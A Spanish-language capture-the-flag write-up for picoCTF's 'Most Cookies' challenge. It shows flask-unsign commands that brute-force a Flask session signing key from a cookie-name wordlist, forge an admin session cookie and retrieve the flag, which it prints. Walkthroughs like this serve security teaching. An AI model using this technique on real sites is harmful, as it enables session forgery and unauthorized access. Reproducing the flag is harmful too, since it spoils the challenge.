Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/26760321c25c9659050a37a707247690/server.py) [http://mercury.picoctf.net:52134/](http://mercury.picoctf.net:52134/)

Hints:
How secure is a flask cookie?

# Solución
Primero analizamos el código python que nos proporcionan y vemos que hay un diccionario con las cookies que usan para firmar la cookie
```python
["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
```
Ponemos estas cookies en un archivo separadas por un salto de linea
```
snickerdoodle  
chocolate chip  
oatmeal raisin  
gingersnap  
shortbread  
peanut butter  
whoopie pie  
sugar  
molasses  
kiss  
biscotti  
butter  
spritz  
snowball  
drop  
thumbprint  
pinwheel  
wafer  
macaroon  
fortune  
crinkle  
icebox  
gingerbread  
tassie  
lebkuchen  
macaron  
black and white  
white chocolate macadamia
```
Despues instalamos la herramienta de flask-unsign para poder ver con cual cookie se firmo la cookie de flask.
Para esto vamos a usar un entorno virtual de python
```
python -m venv ~/.venv  

source ~/.venv/bin/activate 

python3 -m pip install flask-unsign
```
Entonces ya con esto realizamos el ataque con fuerza bruta para ver con que se firmo la cookie
```
flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Z_Bv5Q.Ji7MOGszSp0HRl5Fo-uUWQQmru4" --wordlist cookies.txt
```
Con esto vemos con que se firmo, en este caso 'peanut butter'
```
┌──(.venv)─(diego㉿Tallin)-[~/pico/Web4/MostCookies]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Z_Bv5Q.Ji7MOGszSp0HRl5Fo-uUWQQmru4" --wordlist cookies.txt
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 29 attempts
'peanut butter'
```
Sabiendo esto podemos generar una nueva cookie como admin y firmandola con la palabra secreta que encontramos
```
┌──(.venv)─(diego㉿Tallin)-[~/pico/Web4/MostCookies]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "peanut butter"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z_B1Zw.ZgKmAKO3s0lWvHWfZSTQSwd3jFI
```
Con esto podemos hacer un curl al sitio utilizando la cookie forjada y ver la flag
```
┌──(.venv)─(diego㉿Tallin)-[~/pico/Web4/MostCookies]
└─$ curl -s http://mercury.picoctf.net:52134/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z_B1Zw.ZgKmAKO3s0lWvHWfZSTQSwd3jFI"
```
Flag:
```
<p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_478da04c}</code></p>
```